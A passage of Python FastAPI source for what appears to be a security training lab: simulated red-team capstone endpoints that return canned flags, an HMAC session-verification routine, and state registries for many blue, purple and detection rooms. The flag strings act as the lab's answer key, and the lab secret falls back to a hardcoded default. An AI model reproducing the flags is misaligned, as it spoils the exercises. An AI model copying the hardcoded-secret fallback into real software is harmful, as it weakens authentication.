    return JSONResponse({
        "status": "FOOTHOLD_ACQUIRED",
        "compromised_account": "app_operator",
        "token": "volt_capstone_foothold_token_7719",
        "access_scope": "Standard unprivileged interactive shell on enterprise web tier",
        "next_objective": "Escalate privileges to root/administrator using local system audit finding.",
        "flag": "NOENTRY{capstone_foothold_compromise_3319}",
    })


@capstone_app.api_route("/api/capstone/privesc", methods=["GET", "POST"])
async def capstone_privesc(request: Request, technique: str = "suid"):
    req_tech = technique
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                req_tech = data.get("technique", req_tech)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                req_tech = form.get("technique", req_tech)
            except Exception:
                pass

    if _CAPSTONE_STATE["remediated"]:
        return JSONResponse(status_code=403, content={"detail": "Privilege escalation blocked: Least privilege enforced."})

    _CAPSTONE_STATE["privesc_achieved"] = True
    return JSONResponse({
        "status": "ROOT_ELEVATION_CONFIRMED",
        "effective_identity": "root (uid 0)",
        "technique_utilized": req_tech or "suid",
        "system_vault": "CAPSTONE_VAULT_DECRYPTED",
        "flag": "NOENTRY{capstone_privilege_breach_8804}",
    })


@capstone_app.api_route("/api/capstone/report", methods=["GET", "POST"])
async def capstone_report(request: Request):
    findings_count = 3
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                findings_count = len(data.get("critical_findings", [1, 2, 3]))
            except Exception:
                pass

    _CAPSTONE_STATE["report_submitted"] = True
    return JSONResponse({
        "status": "ASSESSMENT_REPORT_ACCEPTED",
        "assessor_status": "CERTIFIED_RED_TEAM_OPERATOR",
        "executive_summary": "Authorized penetration assessment successfully completed within defined ROE. Full attack chain documented from perimeter recon to privilege escalation and defensive remediation.",
        "findings_logged": findings_count,
        "recommendations": [
            "Implement parameterized commands to defeat injection vulnerabilities.",
            "Audit and revoke non-essential SUID/SGID binaries and sudoers wildcard privileges.",
            "Enforce Active Directory Kerberos AES encryption and deploy Group Managed Service Accounts.",
        ],
        "flag": "NOENTRY{capstone_master_assessor_7749}",
    })


@capstone_app.post("/api/remediate")
def capstone_remediate():
    _CAPSTONE_STATE["remediated"] = True
    return JSONResponse({
        "status": "ENTERPRISE_HARDENED",
        "defense_posture": "All capstone vulnerabilities patched, least privilege enforced, monitoring alerts configured.",
    })


# ============================================================================
# BLUE TEAM SESSION-SCOPED STATE ISOLATION REGISTRY & TRUSTED IDENTITY ENGINE
# ============================================================================

INTERNAL_LAB_SECRET = os.getenv("NOENTRY_INTERNAL_SECRET", "noentry-internal-auth-seal-key-991204")


def generate_trusted_session_signature(
    session_id: str, operator_id: str, expires_at: int, secret: Optional[str] = None
) -> str:
    """Generate an authoritative cryptographic HMAC signature for lab communications."""
    sec = secret or INTERNAL_LAB_SECRET
    msg = f"{session_id}:{operator_id}:{expires_at}".encode("utf-8")
    return hmac.new(sec.encode("utf-8"), msg, hashlib.sha256).hexdigest()


def verify_trusted_session_signature(
    session_id: str, operator_id: str, expires_at: int, signature: str, secret: Optional[str] = None
) -> bool:
    """Verify cryptographic HMAC signature and ensure timestamp is unexpired."""
    if not signature or not session_id or not operator_id:
        return False
    now_ts = int(time.time())
    if expires_at < now_ts:
        return False
    expected = generate_trusted_session_signature(session_id, operator_id, expires_at, secret)
    return hmac.compare_digest(expected, signature)


def require_trusted_session(request: Request) -> tuple[Optional[str], Optional[str], Optional[JSONResponse]]:
    """
    Authoritative identity verification engine.
    Extracts and validates trusted session and operator identity:
    - Dedicated container environment: bound to container's immutable env vars.
    - Process emulation / shared runtime: bound to cryptographic HMAC signature.

    Verifies that client-supplied identity headers or query parameters do not
    attempt cross-session or cross-operator impersonation.
    Fails closed (401 Unauthorized / 403 Forbidden). Never uses 'default'.
    """
    env_sess = os.getenv("NOENTRY_SESSION_ID", "").strip()
    env_op = os.getenv("NOENTRY_OPERATOR_ID", "").strip()

    trusted_sess: Optional[str] = None
    trusted_op: Optional[str] = None

    # 1. Check for dedicated container environment
    if env_sess and env_op:
        trusted_sess = env_sess
        trusted_op = env_op

    # 2. Check for backend HMAC authentication signature
    sig = request.headers.get("X-Lab-Auth-Signature", "").strip()
    if sig:
        sig_sess = request.headers.get("X-Lab-Session-ID", "").strip()
        sig_op = request.headers.get("X-Lab-Operator-ID", "").strip()
        sig_exp_raw = request.headers.get("X-Lab-Expires-At", "").strip()
        if not sig_sess or not sig_op or not sig_exp_raw:
            return None, None, JSONResponse(
                status_code=401,
                content={
                    "status": "UNAUTHORIZED",
                    "error": "INVALID_OR_EXPIRED_CREDENTIALS",
                    "message": "Incomplete session authentication credentials.",
                },
            )
        try:
            sig_exp = int(sig_exp_raw)
        except ValueError:
            return None, None, JSONResponse(
                status_code=401,
                content={
                    "status": "UNAUTHORIZED",
                    "error": "INVALID_OR_EXPIRED_CREDENTIALS",
                    "message": "Malformed credential expiration timestamp.",
                },
            )
        if not verify_trusted_session_signature(sig_sess, sig_op, sig_exp, sig):
            return None, None, JSONResponse(
                status_code=401,
                content={
                    "status": "UNAUTHORIZED",
                    "error": "INVALID_OR_EXPIRED_CREDENTIALS",
                    "message": "Invalid or expired session signature.",
                },
            )
        # If running in a container, ensure signature matches container env
        if trusted_sess and trusted_sess != sig_sess:
            return None, None, JSONResponse(
                status_code=403,
                content={
                    "status": "FORBIDDEN",
                    "error": "IMPERSONATION_DETECTED",
                    "message": "Signature session ID conflicts with container environment.",
                },
            )
        if trusted_op and trusted_op != sig_op:
            return None, None, JSONResponse(
                status_code=403,
                content={
                    "status": "FORBIDDEN",
                    "error": "IMPERSONATION_DETECTED",
                    "message": "Signature operator ID conflicts with container environment.",
                },
            )
        trusted_sess = sig_sess
        trusted_op = sig_op

    # 3. If neither container environment nor valid backend signature is present, fail closed
    if not trusted_sess or not trusted_op:
        return None, None, JSONResponse(
            status_code=401,
            content={
                "status": "UNAUTHORIZED",
                "error": "AUTH_REQUIRED",
                "message": "Missing trusted lab session identity. Unauthenticated requests are rejected.",
            },
        )

    # 4. Impersonation Audit: Validate that client did not supply conflicting identity assertions
    # Check client session assertions
    for hdr in ("X-Session-ID", "X-Lab-Session"):
        val = request.headers.get(hdr)
        if val and val.strip() and val.strip() != trusted_sess:
            return None, None, JSONResponse(
                status_code=403,
                content={
                    "status": "FORBIDDEN",
                    "error": "IMPERSONATION_DETECTED",
                    "message": f"Cross-session identity spoofing rejected: header '{hdr}' does not match trusted session.",
                },
            )
    qp_sess = request.query_params.get("session_id")
    if qp_sess and qp_sess.strip() and qp_sess.strip() != trusted_sess:
        return None, None, JSONResponse(
            status_code=403,
            content={
                "status": "FORBIDDEN",
                "error": "IMPERSONATION_DETECTED",
                "message": "Cross-session identity spoofing rejected: query parameter 'session_id' does not match trusted session.",
            },
        )

    # Check client operator/user assertions
    for hdr in ("X-Operator-ID", "X-User-ID"):
        val = request.headers.get(hdr)
        if val and val.strip() and val.strip() != trusted_op:
            return None, None, JSONResponse(
                status_code=403,
                content={
                    "status": "FORBIDDEN",
                    "error": "IMPERSONATION_DETECTED",
                    "message": f"Cross-session operator spoofing rejected: header '{hdr}' does not match trusted operator.",
                },
            )
    for qp in ("operator_id", "user_id"):
        val = request.query_params.get(qp)
        if val and val.strip() and val.strip() != trusted_op:
            return None, None, JSONResponse(
                status_code=403,
                content={
                    "status": "FORBIDDEN",
                    "error": "IMPERSONATION_DETECTED",
                    "message": f"Cross-session operator spoofing rejected: query parameter '{qp}' does not match trusted operator.",
                },
            )

    return trusted_sess, trusted_op, None


def _extract_session_key(request: Optional[Request] = None) -> str:
    """Deprecated: returns authoritative session ID from trusted verification."""
    if request:
        sess, _, _ = require_trusted_session(request)
        if sess:
            return sess
    env_sess = os.getenv("NOENTRY_SESSION_ID", "").strip()
    if env_sess:
        return env_sess
    raise ValueError("No trusted session identity available.")


# State Registries for Blue Team Rooms 01–12
_SOC_SESSIONS: Dict[str, Dict[str, Any]] = {}
_WIN_SESSIONS: Dict[str, Dict[str, Any]] = {}
_LINUX_SESSIONS: Dict[str, Dict[str, Any]] = {}
_TRAFFIC_SESSIONS: Dict[str, Dict[str, Any]] = {}
_WIRESHARK_SESSIONS: Dict[str, Dict[str, Any]] = {}
_LOG_SESSIONS: Dict[str, Dict[str, Any]] = {}
_SIEM_SESSIONS: Dict[str, Dict[str, Any]] = {}
_WIN_EVENT_SESSIONS: Dict[str, Dict[str, Any]] = {}
_BRUTEFORCE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_MALWARE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PHISHING_SESSIONS: Dict[str, Dict[str, Any]] = {}
_ENDPOINT_SESSIONS: Dict[str, Dict[str, Any]] = {}
_NIDS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_HUNT_SESSIONS: Dict[str, Dict[str, Any]] = {}
_TRIAGE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_RESPONSE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_FORENSICS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_HARDENING_SESSIONS: Dict[str, Dict[str, Any]] = {}
_INTEL_SESSIONS: Dict[str, Dict[str, Any]] = {}
_BLUE_CAPSTONE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_FOUNDATIONS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_ATTCK_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_SIMULATION_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_RECON_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_PRIVESC_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_INJECTION_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_LATERAL_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_PERSIST_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_C2_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_EXFIL_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_RANSOMWARE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_CLOUD_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_SUPPLY_CHAIN_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_API_ABUSE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_AD_ATTACKS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_CICD_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_EDR_BYPASS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_HEATMAP_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_CONTINUOUS_VAL_SESSIONS: Dict[str, Dict[str, Any]] = {}
_PURPLE_CAPSTONE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_FOUNDATIONS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_NORMALIZATION_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_SIGMA_SYNTAX_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_PROCESS_CREATION_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_NETWORK_RULES_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_FILE_REGISTRY_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_AUTH_ABUSE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_POWERSHELL_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_WEB_RULES_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_MODSEC_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_WAZUH_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_FALSE_POSITIVE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_THRESHOLD_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_CORRELATION_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_UNIT_TESTING_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_YARA_HUNTING_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_SURICATA_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_HUNT_HYPOTHESIS_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_PIPELINE_SESSIONS: Dict[str, Dict[str, Any]] = {}
_DETECTION_CAPSTONE_SESSIONS: Dict[str, Dict[str, Any]] = {}


def get_soc_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _SOC_SESSIONS:
        _SOC_SESSIONS[session_key] = {"triaged_events": [], "remediated": False, "timeline_verified": False}
    return _SOC_SESSIONS[session_key]


def get_win_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _WIN_SESSIONS:
        _WIN_SESSIONS[session_key] = {"privilege_audited": False, "remediated": False, "lockout_policy_enforced": False}
    return _WIN_SESSIONS[session_key]


def get_linux_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _LINUX_SESSIONS:
        _LINUX_SESSIONS[session_key] = {"attribution_verified": False, "remediated": False}
    return _LINUX_SESSIONS[session_key]


def get_traffic_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _TRAFFIC_SESSIONS:
        _TRAFFIC_SESSIONS[session_key] = {"remediated": False}
    return _TRAFFIC_SESSIONS[session_key]


def get_wireshark_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _WIRESHARK_SESSIONS:
        _WIRESHARK_SESSIONS[session_key] = {"filter_verified": False}
    return _WIRESHARK_SESSIONS[session_key]


def get_log_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _LOG_SESSIONS:
        _LOG_SESSIONS[session_key] = {"correlated": False}
    return _LOG_SESSIONS[session_key]


def get_siem_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _SIEM_SESSIONS:
        _SIEM_SESSIONS[session_key] = {"custom_rules": [], "incident_prioritized": False}
    return _SIEM_SESSIONS[session_key]


def get_win_event_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _WIN_EVENT_SESSIONS:
        _WIN_EVENT_SESSIONS[session_key] = {"investigated": False}
    return _WIN_EVENT_SESSIONS[session_key]


def get_bruteforce_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _BRUTEFORCE_SESSIONS:
        _BRUTEFORCE_SESSIONS[session_key] = {"rule_deployed": False, "contained": False, "blocked_ips": [], "campaign_verified": False}
    return _BRUTEFORCE_SESSIONS[session_key]


def get_malware_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _MALWARE_SESSIONS:
        _MALWARE_SESSIONS[session_key] = {"quarantined": True, "yara_deployed": False, "sample_triaged": False}
    return _MALWARE_SESSIONS[session_key]


def get_phishing_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PHISHING_SESSIONS:
        _PHISHING_SESSIONS[session_key] = {"triage_count": 0, "quarantined_domains": [], "triage_accepted": False, "domain_quarantined": False}
    return _PHISHING_SESSIONS[session_key]


def get_endpoint_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _ENDPOINT_SESSIONS:
        _ENDPOINT_SESSIONS[session_key] = {"isolated_hosts": [], "terminated_pids": [], "rule_deployed": False, "host_isolated": False}
    return _ENDPOINT_SESSIONS[session_key]


def get_nids_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _NIDS_SESSIONS:
        _NIDS_SESSIONS[session_key] = {"rule_deployed": False, "custom_rules": [], "intrusion_verified": False, "blocked_ips": []}
    return _NIDS_SESSIONS[session_key]


def get_hunt_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _HUNT_SESSIONS:
        _HUNT_SESSIONS[session_key] = {"query_deployed": False, "queries": [], "hunt_verified": False, "remediated_tasks": []}
    return _HUNT_SESSIONS[session_key]


def get_triage_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _TRIAGE_SESSIONS:
        _TRIAGE_SESSIONS[session_key] = {"classified": False, "classification": None, "triage_verified": False, "escalated": False}
    return _TRIAGE_SESSIONS[session_key]


def get_response_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _RESPONSE_SESSIONS:
        _RESPONSE_SESSIONS[session_key] = {"contained": False, "eradicated": False, "lifecycle_verified": False, "evidence_preserved": True}
    return _RESPONSE_SESSIONS[session_key]


def get_forensics_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _FORENSICS_SESSIONS:
        _FORENSICS_SESSIONS[session_key] = {
            "timeline_verified": False,
            "timeline_events": [],
            "case_verified": False,
            "evidence_hashed": False,
        }
    return _FORENSICS_SESSIONS[session_key]


def get_hardening_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _HARDENING_SESSIONS:
        _HARDENING_SESSIONS[session_key] = {
            "linux_remediated": False,
            "windows_remediated": False,
            "hardening_verified": False,
            "linux_controls": {},
            "windows_controls": {},
        }
    return _HARDENING_SESSIONS[session_key]


def get_intel_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _INTEL_SESSIONS:
        _INTEL_SESSIONS[session_key] = {
            "correlated": False,
            "correlation_data": {},
            "attck_mapped": False,
            "attck_techniques": [],
            "intel_verified": False,
        }
    return _INTEL_SESSIONS[session_key]


def get_blue_capstone_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _BLUE_CAPSTONE_SESSIONS:
        _BLUE_CAPSTONE_SESSIONS[session_key] = {
            "detect_verified": False,
            "hunt_verified": False,
            "forensics_verified": False,
            "triage_verified": False,
            "contain_verified": False,
            "capstone_complete": False,
        }
    return _BLUE_CAPSTONE_SESSIONS[session_key]


def get_purple_foundations_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_FOUNDATIONS_SESSIONS:
        _PURPLE_FOUNDATIONS_SESSIONS[session_key] = {
            "scope_approved": False,
            "telemetry_mapped": False,
            "foundations_verified": False,
            "scope_data": {},
            "telemetry_data": {},
        }
    return _PURPLE_FOUNDATIONS_SESSIONS[session_key]


def get_purple_attck_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_ATTCK_SESSIONS:
        _PURPLE_ATTCK_SESSIONS[session_key] = {
            "evidence_retrieved": False,
            "evidence_mapped": False,
            "attck_verified": False,
            "mapped_techniques": [],
        }
    return _PURPLE_ATTCK_SESSIONS[session_key]


def get_purple_simulation_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_SIMULATION_SESSIONS:
        _PURPLE_SIMULATION_SESSIONS[session_key] = {
            "scope_validated": False,
            "step_registered": False,
            "simulation_approved": False,
            "simulation_steps": [],
        }
    return _PURPLE_SIMULATION_SESSIONS[session_key]


def get_purple_recon_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_RECON_SESSIONS:
        _PURPLE_RECON_SESSIONS[session_key] = {
            "scan_detected": True,
            "correlation_confirmed": False,
            "threshold_tuned": False,
            "recon_validated": False,
            "correlated_data": {},
        }
    return _PURPLE_RECON_SESSIONS[session_key]


def get_purple_privesc_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_PRIVESC_SESSIONS:
        _PURPLE_PRIVESC_SESSIONS[session_key] = {
            "uac_emulated": False,
            "detection_tuned": False,
            "privesc_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_PRIVESC_SESSIONS[session_key]


def get_purple_injection_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_INJECTION_SESSIONS:
        _PURPLE_INJECTION_SESSIONS[session_key] = {
            "injection_emulated": False,
            "edr_tuned": False,
            "defense_evasion_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_INJECTION_SESSIONS[session_key]


def get_purple_lateral_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_LATERAL_SESSIONS:
        _PURPLE_LATERAL_SESSIONS[session_key] = {
            "lateral_emulated": False,
            "rule_tuned": False,
            "lateral_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_LATERAL_SESSIONS[session_key]


def get_purple_persist_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_PERSIST_SESSIONS:
        _PURPLE_PERSIST_SESSIONS[session_key] = {
            "persistence_emulated": False,
            "task_remediated": False,
            "persistence_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_PERSIST_SESSIONS[session_key]


def get_purple_c2_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_C2_SESSIONS:
        _PURPLE_C2_SESSIONS[session_key] = {
            "c2_emulated": False,
            "detection_tuned": False,
            "c2_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_C2_SESSIONS[session_key]


def get_purple_exfil_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_EXFIL_SESSIONS:
        _PURPLE_EXFIL_SESSIONS[session_key] = {
            "exfil_emulated": False,
            "dlp_tuned": False,
            "exfil_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_EXFIL_SESSIONS[session_key]


def get_purple_ransomware_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_RANSOMWARE_SESSIONS:
        _PURPLE_RANSOMWARE_SESSIONS[session_key] = {
            "ransomware_emulated": False,
            "canary_tuned": False,
            "ransomware_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_RANSOMWARE_SESSIONS[session_key]


def get_purple_cloud_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_CLOUD_SESSIONS:
        _PURPLE_CLOUD_SESSIONS[session_key] = {
            "cloud_iam_emulated": False,
            "pipeline_tuned": False,
            "cloud_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_CLOUD_SESSIONS[session_key]


def get_purple_supply_chain_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_SUPPLY_CHAIN_SESSIONS:
        _PURPLE_SUPPLY_CHAIN_SESSIONS[session_key] = {
            "supply_chain_emulated": False,
            "pinning_tuned": False,
            "supply_chain_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_SUPPLY_CHAIN_SESSIONS[session_key]


def get_purple_api_abuse_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_API_ABUSE_SESSIONS:
        _PURPLE_API_ABUSE_SESSIONS[session_key] = {
            "bola_emulated": False,
            "gateway_tuned": False,
            "api_abuse_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_API_ABUSE_SESSIONS[session_key]


def get_purple_ad_attacks_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_AD_ATTACKS_SESSIONS:
        _PURPLE_AD_ATTACKS_SESSIONS[session_key] = {
            "kerberoasting_emulated": False,
            "dc_rule_tuned": False,
            "ad_attack_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_AD_ATTACKS_SESSIONS[session_key]


def get_purple_cicd_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_CICD_SESSIONS:
        _PURPLE_CICD_SESSIONS[session_key] = {
            "cicd_pipeline_emulated": False,
            "pipeline_audit_tuned": False,
            "cicd_pipeline_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_CICD_SESSIONS[session_key]


def get_purple_edr_bypass_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_EDR_BYPASS_SESSIONS:
        _PURPLE_EDR_BYPASS_SESSIONS[session_key] = {
            "edr_bypass_emulated": False,
            "etw_tuned": False,
            "edr_bypass_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_EDR_BYPASS_SESSIONS[session_key]


def get_purple_heatmap_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_HEATMAP_SESSIONS:
        _PURPLE_HEATMAP_SESSIONS[session_key] = {
            "heatmap_emulated": False,
            "overlay_tuned": False,
            "heatmap_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_HEATMAP_SESSIONS[session_key]


def get_purple_continuous_validation_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_CONTINUOUS_VAL_SESSIONS:
        _PURPLE_CONTINUOUS_VAL_SESSIONS[session_key] = {
            "continuous_val_emulated": False,
            "guardrails_tuned": False,
            "continuous_val_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_CONTINUOUS_VAL_SESSIONS[session_key]


def get_purple_capstone_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _PURPLE_CAPSTONE_SESSIONS:
        _PURPLE_CAPSTONE_SESSIONS[session_key] = {
            "capstone_emulated": False,
            "rules_tuned": False,
            "capstone_validated": False,
            "emulation_data": {},
        }
    return _PURPLE_CAPSTONE_SESSIONS[session_key]


def get_detection_foundations_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_FOUNDATIONS_SESSIONS:
        _DETECTION_FOUNDATIONS_SESSIONS[session_key] = {
            "pipeline_emulated": False,
            "snr_tuned": False,
            "foundations_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_FOUNDATIONS_SESSIONS[session_key]


def get_detection_normalization_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_NORMALIZATION_SESSIONS:
        _DETECTION_NORMALIZATION_SESSIONS[session_key] = {
            "normalization_emulated": False,
            "taxonomy_tuned": False,
            "normalization_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_NORMALIZATION_SESSIONS[session_key]


def get_detection_sigma_syntax_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_SIGMA_SYNTAX_SESSIONS:
        _DETECTION_SIGMA_SYNTAX_SESSIONS[session_key] = {
            "sigma_syntax_emulated": False,
            "condition_tuned": False,
            "sigma_syntax_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_SIGMA_SYNTAX_SESSIONS[session_key]


def get_detection_process_creation_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_PROCESS_CREATION_SESSIONS:
        _DETECTION_PROCESS_CREATION_SESSIONS[session_key] = {
            "process_creation_emulated": False,
            "lolbin_filter_tuned": False,
            "process_creation_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_PROCESS_CREATION_SESSIONS[session_key]


def get_detection_network_rules_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_NETWORK_RULES_SESSIONS:
        _DETECTION_NETWORK_RULES_SESSIONS[session_key] = {
            "network_connection_emulated": False,
            "network_filter_tuned": False,
            "network_connection_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_NETWORK_RULES_SESSIONS[session_key]


def get_detection_file_registry_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_FILE_REGISTRY_SESSIONS:
        _DETECTION_FILE_REGISTRY_SESSIONS[session_key] = {
            "file_registry_emulated": False,
            "registry_filter_tuned": False,
            "file_registry_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_FILE_REGISTRY_SESSIONS[session_key]


def get_detection_auth_abuse_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_AUTH_ABUSE_SESSIONS:
        _DETECTION_AUTH_ABUSE_SESSIONS[session_key] = {
            "auth_abuse_emulated": False,
            "auth_baseline_tuned": False,
            "auth_abuse_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_AUTH_ABUSE_SESSIONS[session_key]


def get_detection_powershell_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_POWERSHELL_SESSIONS:
        _DETECTION_POWERSHELL_SESSIONS[session_key] = {
            "powershell_obfuscation_emulated": False,
            "cradle_regex_tuned": False,
            "powershell_obfuscation_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_POWERSHELL_SESSIONS[session_key]


def get_detection_web_rules_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_WEB_RULES_SESSIONS:
